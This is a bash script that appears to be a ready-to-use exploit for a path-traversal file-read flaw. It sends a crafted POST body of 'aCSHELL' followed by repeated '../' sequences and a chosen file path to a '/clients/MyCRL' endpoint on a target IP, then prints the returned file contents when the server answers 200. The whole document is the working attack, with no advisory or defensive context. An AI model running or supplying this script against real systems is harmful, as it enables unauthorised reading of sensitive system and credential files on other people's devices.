#!/bin/bash

# Usage function to display correct script usage
usage() {
    echo "Usage: $0 -u ip -f target_file"
    exit 1
}

# Parse command line arguments
while getopts ":u:f:" opt; do
    case $opt in
        u) ip=$OPTARG ;;
        f) target_file=$OPTARG ;;
        *) usage ;;
    esac
done

# Check if required arguments are provided
if [ -z "$ip" ] || [ -z "$target_file" ]; then
    usage
fi

# Construct the curl command
curl_command="curl --path-as-is -i -s -k -X 'POST' \
        -H 'Host: ${ip}' -H 'Content-Length: 39' -H 'Connection: keep-alive' \
        --data-binary 'aCSHELL/../../../../../../../${target_file}' \
        'https://${ip}/clients/MyCRL'"

# Execute the curl command and capture the response
response=$(eval $curl_command)

# Extract HTTP status code and response body
http_status=$(echo "$response" | grep HTTP | awk '{print $2}')
response_body=$(echo "$response" | sed '1,/^$/d')

# Check if the HTTP status code is empty
if [ -z "$http_status" ]; then
    echo "Error: Unable to retrieve HTTP status code."
    exit 1
fi

# Check if the response indicates a successful exploitation
if [ "$http_status" -eq 200 ]; then
    echo "Request was successful!!!!"
    echo "Response content:"
    echo "$response_body"
else
    echo "Target might not be vulnerable..."
    exit 1
fi
